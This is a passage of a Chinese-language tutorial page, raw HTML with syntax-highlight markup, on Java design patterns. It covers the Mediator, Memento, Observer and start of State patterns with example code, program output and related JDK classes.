keyword">public</span> <span class="token keyword">void</span> <span class="token function">doCalenderEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doSprinklerEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ...</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Alarm alarm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Alarm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CoffeePot coffeePot <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CoffeePot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Calender calender <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Calender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Sprinkler sprinkler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Sprinkler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Mediator mediator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteMediator</span><span class="token punctuation">(</span>alarm<span class="token punctuation">,</span> coffeePot<span class="token punctuation">,</span> calender<span class="token punctuation">,</span> sprinkler<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 闹钟事件到达，调用中介者就可以操作相关对象</span>        alarm<span class="token punctuation">.</span><span class="token function">onEvent</span><span class="token punctuation">(</span>mediator<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">doAlarm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">doCoffeePot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">doCalender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">doSprinkler</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="JDK-9"><a href="#JDK-9" class="headerlink" title="JDK"></a>JDK</h3><ul><li>All scheduleXXX() methods of <a href="http://docs.oracle.com/javase/8/docs/api/java/util/Timer.html" target="_blank" rel="noopener">java.util.Timer</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/concurrent/Executor.html#execute-java.lang.Runnable-" target="_blank" rel="noopener">java.util.concurrent.Executor#execute()</a></li><li>submit() and invokeXXX() methods of <a href="http://docs.oracle.com/javase/8/docs/api/java/util/concurrent/ExecutorService.html" target="_blank" rel="noopener">java.util.concurrent.ExecutorService</a></li><li>scheduleXXX() methods of <a href="http://docs.oracle.com/javase/8/docs/api/java/util/concurrent/ScheduledExecutorService.html" target="_blank" rel="noopener">java.util.concurrent.ScheduledExecutorService</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Method.html#invoke-java.lang.Object-java.lang.Object...-" target="_blank" rel="noopener">java.lang.reflect.Method#invoke()</a></li></ul><h2 id="6-备忘录（Memento）"><a href="#6-备忘录（Memento）" class="headerlink" title="6. 备忘录（Memento）"></a>6. 备忘录（Memento）</h2><h3 id="Intent-11"><a href="#Intent-11" class="headerlink" title="Intent"></a>Intent</h3><p>在不违反封装的情况下获得对象的内部状态，从而在需要时可以将对象恢复到最初状态。</p><h3 id="Class-Diagram-11"><a href="#Class-Diagram-11" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><ul><li>Originator：原始对象</li><li>Caretaker：负责保存好备忘录</li><li>Menento：备忘录，存储原始对象的的状态。备忘录实际上有两个接口，一个是提供给 Caretaker 的窄接口：它只能将备忘录传递给其它对象；一个是提供给 Originator 的宽接口，允许它访问到先前状态所需的所有数据。理想情况是只允许 Originator 访问本备忘录的内部状态。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/867e93eb-3161-4f39-b2d2-c0cd3788e194.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/867e93eb-3161-4f39-b2d2-c0cd3788e194.png" alt="img"></a></p><h3 id="Implementation-11"><a href="#Implementation-11" class="headerlink" title="Implementation"></a>Implementation</h3><p>以下实现了一个简单计算器程序，可以输入两个值，然后计算这两个值的和。备忘录模式允许将这两个值存储起来，然后在某个时刻用存储的状态进行恢复。</p><p>实现参考：<a href="https://www.oodesign.com/memento-pattern-calculator-example-java-sourcecode.html" target="_blank" rel="noopener">Memento Pattern - Calculator Example - Java Sourcecode</a></p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * Originator Interface */</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Calculator</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Create Memento</span>    PreviousCalculationToCareTaker <span class="token function">backupLastCalculation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// setMemento</span>    <span class="token keyword">void</span> <span class="token function">restorePreviousCalculation</span><span class="token punctuation">(</span>PreviousCalculationToCareTaker memento<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">getCalculationResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">setFirstNumber</span><span class="token punctuation">(</span><span class="token keyword">int</span> firstNumber<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">setSecondNumber</span><span class="token punctuation">(</span><span class="token keyword">int</span> secondNumber<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * Originator Implementation */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CalculatorImp</span> <span class="token keyword">implements</span> <span class="token class-name">Calculator</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> firstNumber<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> secondNumber<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> PreviousCalculationToCareTaker <span class="token function">backupLastCalculation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// create a memento object used for restoring two numbers</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">PreviousCalculationImp</span><span class="token punctuation">(</span>firstNumber<span class="token punctuation">,</span> secondNumber<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">restorePreviousCalculation</span><span class="token punctuation">(</span>PreviousCalculationToCareTaker memento<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>firstNumber <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>PreviousCalculationToOriginator<span class="token punctuation">)</span> memento<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getFirstNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>secondNumber <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>PreviousCalculationToOriginator<span class="token punctuation">)</span> memento<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getSecondNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getCalculationResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// result is adding two numbers</span>        <span class="token keyword">return</span> firstNumber <span class="token operator">+</span> secondNumber<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setFirstNumber</span><span class="token punctuation">(</span><span class="token keyword">int</span> firstNumber<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>firstNumber <span class="token operator">=</span> firstNumber<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSecondNumber</span><span class="token punctuation">(</span><span class="token keyword">int</span> secondNumber<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>secondNumber <span class="token operator">=</span> secondNumber<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * Memento Interface to Originator * * This interface allows the originator to restore its state */</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">PreviousCalculationToOriginator</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> <span class="token function">getFirstNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token function">getSecondNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** *  Memento interface to CalculatorOperator (Caretaker) */</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">PreviousCalculationToCareTaker</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// no operations permitted for the caretaker</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * Memento Object Implementation * &lt;p> * Note that this object implements both interfaces to Originator and CareTaker */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PreviousCalculationImp</span> <span class="token keyword">implements</span> <span class="token class-name">PreviousCalculationToCareTaker</span><span class="token punctuation">,</span>        PreviousCalculationToOriginator <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> firstNumber<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> secondNumber<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">PreviousCalculationImp</span><span class="token punctuation">(</span><span class="token keyword">int</span> firstNumber<span class="token punctuation">,</span> <span class="token keyword">int</span> secondNumber<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>firstNumber <span class="token operator">=</span> firstNumber<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>secondNumber <span class="token operator">=</span> secondNumber<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getFirstNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> firstNumber<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSecondNumber</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> secondNumber<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * CareTaker object */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// program starts</span>        Calculator calculator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CalculatorImp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// assume user enters two numbers</span>        calculator<span class="token punctuation">.</span><span class="token function">setFirstNumber</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        calculator<span class="token punctuation">.</span><span class="token function">setSecondNumber</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// find result</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>calculator<span class="token punctuation">.</span><span class="token function">getCalculationResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Store result of this calculation in case of error</span>        PreviousCalculationToCareTaker memento <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">backupLastCalculation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// user enters a number</span>        calculator<span class="token punctuation">.</span><span class="token function">setFirstNumber</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// user enters a wrong second number and calculates result</span>        calculator<span class="token punctuation">.</span><span class="token function">setSecondNumber</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">290</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// calculate result</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>calculator<span class="token punctuation">.</span><span class="token function">getCalculationResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// user hits CTRL + Z to undo last operation and see last result</span>        calculator<span class="token punctuation">.</span><span class="token function">restorePreviousCalculation</span><span class="token punctuation">(</span>memento<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// result restored</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>calculator<span class="token punctuation">.</span><span class="token function">getCalculationResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token number">110</span><span class="token operator">-</span><span class="token number">273</span><span class="token number">110</span></code></pre><h3 id="JDK-10"><a href="#JDK-10" class="headerlink" title="JDK"></a>JDK</h3><ul><li>java.io.Serializable</li></ul><h2 id="7-观察者（Observer）"><a href="#7-观察者（Observer）" class="headerlink" title="7. 观察者（Observer）"></a>7. 观察者（Observer）</h2><h3 id="Intent-12"><a href="#Intent-12" class="headerlink" title="Intent"></a>Intent</h3><p>定义对象之间的一对多依赖，当一个对象状态改变时，它的所有依赖都会收到通知并且自动更新状态。</p><p>主题（Subject）是被观察的对象，而其所有依赖者（Observer）称为观察者。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/7a3c6a30-c735-4edb-8115-337288a4f0f2.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/7a3c6a30-c735-4edb-8115-337288a4f0f2.jpg" alt="img"></a></p><h3 id="Class-Diagram-12"><a href="#Class-Diagram-12" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p>主题（Subject）具有注册和移除观察者、并通知所有观察者的功能，主题是通过维护一张观察者列表来实现这些操作的。</p><p>观察者（Observer）的注册功能需要调用主题的 registerObserver() 方法。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/0df5d84c-e7ca-4e3a-a688-bb8e68894467.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/0df5d84c-e7ca-4e3a-a688-bb8e68894467.png" alt="img"></a></p><h3 id="Implementation-12"><a href="#Implementation-12" class="headerlink" title="Implementation"></a>Implementation</h3><p>天气数据布告板会在天气信息发生改变时更新其内容，布告板有多个，并且在将来会继续增加。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/b1df9732-86ce-4d69-9f06-fba1db7b3b5a.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/b1df9732-86ce-4d69-9f06-fba1db7b3b5a.jpg" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Subject</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">registerObserver</span><span class="token punctuation">(</span>Observer o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">removeObserver</span><span class="token punctuation">(</span>Observer o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">notifyObserver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WeatherData</span> <span class="token keyword">implements</span> <span class="token class-name">Subject</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> List<span class="token operator">&lt;</span>Observer<span class="token operator">></span> observers<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">float</span> temperature<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">float</span> humidity<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">float</span> pressure<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">WeatherData</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        observers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMeasurements</span><span class="token punctuation">(</span><span class="token keyword">float</span> temperature<span class="token punctuation">,</span> <span class="token keyword">float</span> humidity<span class="token punctuation">,</span> <span class="token keyword">float</span> pressure<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>temperature <span class="token operator">=</span> temperature<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>humidity <span class="token operator">=</span> humidity<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>pressure <span class="token operator">=</span> pressure<span class="token punctuation">;</span>        <span class="token function">notifyObserver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">registerObserver</span><span class="token punctuation">(</span>Observer o<span class="token punctuation">)</span> <span class="token punctuation">{</span>        observers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">removeObserver</span><span class="token punctuation">(</span>Observer o<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> observers<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            observers<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">notifyObserver</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Observer o <span class="token operator">:</span> observers<span class="token punctuation">)</span> <span class="token punctuation">{</span>            o<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>temperature<span class="token punctuation">,</span> humidity<span class="token punctuation">,</span> pressure<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Observer</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">float</span> temp<span class="token punctuation">,</span> <span class="token keyword">float</span> humidity<span class="token punctuation">,</span> <span class="token keyword">float</span> pressure<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StatisticsDisplay</span> <span class="token keyword">implements</span> <span class="token class-name">Observer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">StatisticsDisplay</span><span class="token punctuation">(</span>Subject weatherData<span class="token punctuation">)</span> <span class="token punctuation">{</span>        weatherData<span class="token punctuation">.</span><span class="token function">reisterObserver</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">float</span> temp<span class="token punctuation">,</span> <span class="token keyword">float</span> humidity<span class="token punctuation">,</span> <span class="token keyword">float</span> pressure<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"StatisticsDisplay.update: "</span> <span class="token operator">+</span> temp <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> humidity <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> pressure<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CurrentConditionsDisplay</span> <span class="token keyword">implements</span> <span class="token class-name">Observer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">CurrentConditionsDisplay</span><span class="token punctuation">(</span>Subject weatherData<span class="token punctuation">)</span> <span class="token punctuation">{</span>        weatherData<span class="token punctuation">.</span><span class="token function">registerObserver</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">float</span> temp<span class="token punctuation">,</span> <span class="token keyword">float</span> humidity<span class="token punctuation">,</span> <span class="token keyword">float</span> pressure<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"CurrentConditionsDisplay.update: "</span> <span class="token operator">+</span> temp <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> humidity <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> pressure<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WeatherStation</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        WeatherData weatherData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeatherData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        CurrentConditionsDisplay currentConditionsDisplay <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CurrentConditionsDisplay</span><span class="token punctuation">(</span>weatherData<span class="token punctuation">)</span><span class="token punctuation">;</span>        StatisticsDisplay statisticsDisplay <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StatisticsDisplay</span><span class="token punctuation">(</span>weatherData<span class="token punctuation">)</span><span class="token punctuation">;</span>        weatherData<span class="token punctuation">.</span><span class="token function">setMeasurements</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        weatherData<span class="token punctuation">.</span><span class="token function">setMeasurements</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>CurrentConditionsDisplay<span class="token punctuation">.</span>update<span class="token operator">:</span> <span class="token number">0.0</span> <span class="token number">0.0</span> <span class="token number">0.0</span>StatisticsDisplay<span class="token punctuation">.</span>update<span class="token operator">:</span> <span class="token number">0.0</span> <span class="token number">0.0</span> <span class="token number">0.0</span>CurrentConditionsDisplay<span class="token punctuation">.</span>update<span class="token operator">:</span> <span class="token number">1.0</span> <span class="token number">1.0</span> <span class="token number">1.0</span>StatisticsDisplay<span class="token punctuation">.</span>update<span class="token operator">:</span> <span class="token number">1.0</span> <span class="token number">1.0</span> <span class="token number">1.0</span></code></pre><h3 id="JDK-11"><a href="#JDK-11" class="headerlink" title="JDK"></a>JDK</h3><ul><li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Observer.html" target="_blank" rel="noopener">java.util.Observer</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/EventListener.html" target="_blank" rel="noopener">java.util.EventListener</a></li><li><a href="http://docs.oracle.com/javaee/7/api/javax/servlet/http/HttpSessionBindingListener.html" target="_blank" rel="noopener">javax.servlet.http.HttpSessionBindingListener</a></li><li><a href="https://github.com/ReactiveX/RxJava">RxJava</a></li></ul><h2 id="8-状态（State）"><a href="#8-状态（State）" class="headerlink" title="8. 状态（State）"></a>8. 状态（State）</h2><h3 id="Intent-13"><a href="#Intent-13" class="headerlink" title="Intent"></a>Intent</h3><p>允许对象在内部状态改变时改变它的行为，对象看起来好像修改了它所属的类。</p><h3 id="Class-Diagram-13"><a href="#Class-Diagram-13" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/c5085437-54df-4304-b62d-44b961711ba7.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/c5085437-54df-4304-b62d-44b961711ba7.png" alt="img"></a></p><h3 id="Implementation-13"><a href="#Implementation-13" class="headerlink" title="Implementation"></a>Implementation</h3><p>糖果销售机有多种状态，每种状态下销售机有不同的行为，状态可以发生转移，使得销售机的行为也发生改变。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/396be981-3f2c-4fd9-8101-dbf9c841504b.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/396be981-3f2c-4fd9-8101-dbf9c841504b.jpg" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">State</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 投入 25 分钱     */</span>    <span class="token keyword">void</span> <span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 退回 25 分钱     */</span>    <span class="token keyword">void</span> <span class="token function">ejectQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 转动曲柄     */</span>    <span class="token keyword">void</span> <span class="token function">turnCrank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 发放糖果     */</span>    <span class="token keyword">void</span> <span class="token function">dispense</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HasQuarterState</span> <span class="token keyword">implements</span> <span class="token class-name">State</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> GumballMachine gumballMachine<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">HasQuarterState</span><span class="token punctuation">(</span>GumballMachine gumballMachine<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>gumballMachine <span class="token operator">=</span> gumballMachine<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">insertQuarter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span 